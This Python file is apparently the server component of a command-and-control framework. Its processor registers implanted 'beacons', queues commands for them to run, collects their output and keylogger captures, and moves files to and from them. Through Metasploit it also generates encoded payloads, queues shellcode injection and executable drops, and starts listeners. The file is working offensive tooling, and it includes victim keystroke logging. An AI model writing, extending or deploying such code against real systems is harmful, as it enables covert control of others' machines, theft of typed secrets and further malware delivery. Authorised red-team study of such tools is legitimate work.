import base64
import uuid
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, Optional, Tuple

import utils
from config import ServerConfig
from database import BeaconRepository
from .metasploit_service import ListenerConfig, MetasploitService, PayloadConfig
from .output_parsers import OutputParserRegistry
from utils import strip_filename_quotes

class CommandProcessor:
    """Processes and validates agent commands"""
    def __init__(self, beacon_repository: BeaconRepository):
        self.beacon_repository = beacon_repository
        self._metasploit_service = None
        self.output_parser_registry = OutputParserRegistry()

    def process_registration(self, beacon_id: str, computer_name: str, receiver_id: str = None, receiver_name: str = None, ip_address: str = None, schema_file: str = None) -> str:
        self.beacon_repository.update_beacon_status(beacon_id, 'online', computer_name, receiver_id, ip_address)

        # Handle optional schema auto-assignment
        if schema_file:
            schema_path = Path("schemas") / schema_file
            if schema_path.exists():
                self.beacon_repository.update_beacon_schema(beacon_id, schema_file)
                if utils.logger:
                    utils.logger.log_message(f"Schema Auto-Assignment: {beacon_id} -> {schema_file}")
            else:
                if utils.logger:
                    utils.logger.log_message(f"Schema Auto-Assignment Failed: {beacon_id} -> {schema_file} (file not found)")

        if utils.logger:
            display_name = receiver_name or receiver_id or "Unknown"
            ip_info = f" from {ip_address}" if ip_address else ""
            schema_info = f" [schema: {schema_file}]" if schema_file else ""
            utils.logger.log_message(f"Beacon Registration: {beacon_id} ({computer_name}) via receiver {display_name}{ip_info}{schema_info}")
        return "Registration successful"

    def process_action_request(self, beacon_id: str, receiver_id: str = None, receiver_name: str = None, ip_address: str = None) -> str:
        beacon = self.beacon_repository.get_beacon(beacon_id)
        self.beacon_repository.update_beacon_status(beacon_id, "online", receiver_id=receiver_id, ip_address=ip_address)
        if not beacon.pending_command:
            if utils.logger:
                utils.logger.log_message(f"Check In: {beacon_id} - No pending commands")
            return "no_pending_commands"

        if not beacon:
            return ""

        command = beacon.pending_command

        # Track this command as the last executed command for output parsing
        self.beacon_repository.update_last_executed_command(beacon_id, command)

        self.beacon_repository.update_beacon_command(beacon_id, None)

        return self._format_command_response(command)

    def process_command_output(self, beacon_id: str, output: str = "", config=None) -> str:
        """Process command output from an agent"""
        if config is None:
            config = ServerConfig()
        try:
            # Store the output in the agent's output file
            output_file = Path(config.LOGS_FOLDER) / f"output_{beacon_id}.txt"
            with open(output_file, 'a', encoding='utf-8') as f:
                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                f.write(f"[{timestamp}] {output}\n")

            # Get the last executed command for parsing
            last_command = self.beacon_repository.get_last_executed_command(beacon_id)

            # Parse output and extract metadata
            if last_command and output:
                try:
                    metadata = self.output_parser_registry.parse_output(last_command, output)
                    if metadata:
                        self.beacon_repository.store_beacon_metadata(
                            beacon_id,
                            metadata,
                            source_command=last_command
                        )
                        if utils.logger:
                            metadata_summary = ', '.join([f"{k}={v}" for k, v in metadata[:3]])
                            if len(metadata) > 3:
                                metadata_summary += f" (+{len(metadata) - 3} more)"
                            utils.logger.log_message(
                                f"Metadata Extracted: {beacon_id} - {metadata_summary}"
                            )
                except Exception as parse_error:
                    if utils.logger:
                        utils.logger.log_message(f"Parser Error: {beacon_id} - {str(parse_error)}")

            # Clear the pending command since received output
            self.beacon_repository.update_beacon_command(beacon_id, None)

            # Update the agent's output file path if needed
            beacon = self.beacon_repository.get_beacon(beacon_id)
            if beacon and not beacon.output_file:
                self.beacon_repository.update_beacon_response(
                    beacon_id,
                    str(output_file)
                )

            return "Output received"
        except Exception as e:
            if utils.logger:
                utils.logger.log_message(f"Command Output Error: {beacon_id} - {str(e)}")
            return f"Error processing output: {str(e)}"
        
    def process_keylogger_output(self, beacon_id: str, output: str = "", config=None) -> str:
        """Process KeyLogger output from an agent"""
        if config is None:
            config = ServerConfig()
        try:
            output_file = Path(config.LOGS_FOLDER) / f"keylogger_output_{beacon_id}.txt"
            
            # Handle special character encodings
            special_chars = {
                "%20": " ",   # Space
                "%0A": "\n",  # Newline
                "%09": "\t",  # Tab
                "%0D": "\r",  # Carriage return
                "%08": "⌫"   # Backspace
            }
            
            # Replace encoded characters
            for encoded, char in special_chars.items():
                output = output.replace(encoded, char)
                
            with open(output_file, 'a', encoding='utf-8') as f:
                f.write(output)
                f.flush()
                
            return "KeyLogger data received"
        except Exception as e:
            if utils.logger:
                utils.logger.log_message(f"Error processing keylogger output: {e}")
            return f"Error: {e}"

    def process_download_status(self, beacon_id: str, filename: str, status: str) -> str:
        self.beacon_repository.update_beacon_response(beacon_id, f"{status}|{filename}")
        return "Status updated"

    @staticmethod
    def _format_command_response(command: str) -> str:
        """Format a command string into a pipe-delimited response format."""

        # Special handling for file operations
        if command.startswith(("download_file ", "upload_file ")):
            action, parameter = command.split(" ", 1)
            # Strip quotes from filename parameter
            parameter = strip_filename_quotes(parameter)
            return f"{action}|{parameter}"
        
        # Handle execute_module commands
        if command.startswith("execute_module"):
            _, parameter = command.split("|", 1)
            return f"execute_module|{parameter}"
        
        # Default case for regular commands
        return f"execute_command|{command}"
    
    @property
    def metasploit_service(self):
        """Lazy load Metasploit service"""
        if self._metasploit_service is None:
            self._metasploit_service = MetasploitService()
        return self._metasploit_service
    
    def process_metasploit_module(self, beacon_id: str, module_name: str, parameters: Dict[str, Any]) -> Tuple[bool, str]:
        """
        Process Metasploit integration modules
        
        Returns:
            Tuple of (success, message)
        """
        
        try:
            if module_name == "deliver_payload":
                return self._handle_deliver_payload(beacon_id, parameters)
            elif module_name == "start_listener":
                return self._handle_start_listener(parameters)
            elif module_name == "stop_listener":
                return self._handle_stop_listener(parameters)
            else:
                return False, f"Unknown Metasploit module: {module_name}"
                
        except Exception as e:
            error_msg = f"Error processing Metasploit module {module_name}: {str(e)}"
            if utils.logger:
                utils.logger.log_message(error_msg)
            return False, error_msg
    
    def _handle_deliver_payload(self, beacon_id: str, parameters: Dict[str, Any]) -> Tuple[bool, str]:
        """Handle payload delivery to a beacon"""
        
        try:
            # Extract parameters
            payload_type = parameters.get('payload_type')
            lhost = parameters.get('LHOST')
            lport = int(parameters.get('LPORT', 4444))
            format_type = parameters.get('format', 'exe')
            encoder = parameters.get('encoder', 'none')
            iterations = int(parameters.get('iterations', 1))
            
            if not payload_type or not lhost:
                return False, "Missing required parameters: payload_type and LHOST"
            
            # Auto-detect LHOST if needed
            if not lhost or lhost == "auto":
                lhost = self.metasploit_service.get_server_ip()
            
            # Create payload configuration
            payload_config = PayloadConfig(
                payload_type=payload_type,
                lhost=lhost,
                lport=lport,
                format=format_type,
                encoder=encoder if encoder != 'none' else None,
                iterations=iterations
            )
            
            if utils.logger:
                utils.logger.log_message(f"Generating Metasploit payload for beacon {beacon_id}: {payload_type}")
            
            # Generate the payload
            success, payload_data, error_msg = self.metasploit_service.generate_payload(payload_config)
            
            if not success:
                return False, f"Payload generation failed: {error_msg}"
            
            # Determine delivery method based on format
            if format_type == 'raw':
                # For raw shellcode, use injection if beacon supports it
                return self._deliver_shellcode(beacon_id, payload_data)
            else:
                # For executables, use file transfer + execute
                return self._deliver_executable(beacon_id, payload_data, format_type)
            
        except Exception as e:
            return False, f"Error in payload delivery: {str(e)}"
    
    def _deliver_shellcode(self, beacon_id: str, shellcode: bytes) -> Tuple[bool, str]:
        """Deliver raw shellcode to beacon for injection"""
        
        try:
            # Encode shellcode as base64 for safe transmission
            shellcode_b64 = base64.b64encode(shellcode).decode('ascii')
            
            # Create injection command (this would depend on beacon capabilities)
            # For now, we'll queue it as a special command
            injection_command = f"inject_shellcode|{shellcode_b64}"
            
            # Queue the command for the beacon
            self.beacon_repository.update_beacon_command(beacon_id, injection_command)
            
            if utils.logger:
                utils.logger.log_message(f"Queued shellcode injection for beacon {beacon_id} ({len(shellcode)} bytes)")
            
            return True, f"Shellcode injection queued ({len(shellcode)} bytes)"
            
        except Exception as e:
            return False, f"Error delivering shellcode: {str(e)}"
    
    def _deliver_executable(self, beacon_id: str, executable_data: bytes, format_type: str) -> Tuple[bool, str]:
        """Deliver executable payload to beacon via file transfer"""
        
        try:
            config = ServerConfig()
            
            # Create temporary filename for the payload
            temp_filename = f"payload_{uuid.uuid4().hex[:8]}.{format_type}"
            temp_filepath = Path(config.FILES_FOLDER) / temp_filename
            
            # Write payload to temporary file
            with open(temp_filepath, 'wb') as f:
                f.write(executable_data)
            
            # Queue file transfer command (beacon will download the file)
            transfer_command = f"download_file|{temp_filename}"
            self.beacon_repository.update_beacon_command(beacon_id, transfer_command)
            
            if utils.logger:
                utils.logger.log_message(f"Queued payload download for beacon {beacon_id}: {temp_filename} ({len(executable_data)} bytes)")
            
            # Note: In a complete implementation, we'd need to:
            # 1. Wait for download completion
            # 2. Queue execution command
            # 3. Clean up the temporary file
            # This would require a more sophisticated workflow system
            
            return True, f"Payload download queued: {temp_filename} ({len(executable_data)} bytes)"
            
        except Exception as e:
            return False, f"Error delivering executable: {str(e)}"
    
    def _handle_start_listener(self, parameters: Dict[str, Any]) -> Tuple[bool, str]:
        """Handle starting a Metasploit listener"""
        
        try:
            payload_type = parameters.get('payload_type')
            lhost = parameters.get('LHOST', '0.0.0.0')
            lport = int(parameters.get('LPORT', 4444))
            exit_on_session = bool(parameters.get('ExitOnSession', False))
            
            if not payload_type:
                return False, "Missing required parameter: payload_type"
            
            # Create listener configuration
            listener_config = ListenerConfig(
                payload_type=payload_type,
                lhost=lhost,
                lport=lport,
                exit_on_session=exit_on_session
            )
            
            if utils.logger:
                utils.logger.log_message(f"Starting Metasploit listener: {payload_type} on {lhost}:{lport}")
            
            # Start the listener
            success, job_id, error_msg = self.metasploit_service.start_listener(listener_config)
            
            if success:
                return True, f"Listener started with job ID: {job_id}"
            else:
                return False, f"Failed to start listener: {error_msg}"
                
        except Exception as e:
            return False, f"Error starting listener: {str(e)}"
    
    def _handle_stop_listener(self, parameters: Dict[str, Any]) -> Tuple[bool, str]:
        """Handle stopping a Metasploit listener"""
        
        try:
            job_id = parameters.get('job_id')
            
            if not job_id:
                return False, "Missing required parameter: job_id"
            
            if utils.logger:
                utils.logger.log_message(f"Stopping Metasploit listener: {job_id}")
            
            # Stop the listener
            success, error_msg = self.metasploit_service.stop_listener(job_id)
            
            if success:
                return True, f"Listener {job_id} stopped"
            else:
                return False, f"Failed to stop listener: {error_msg}"
                
        except Exception as e:
            return False, f"Error stopping listener: {str(e)}"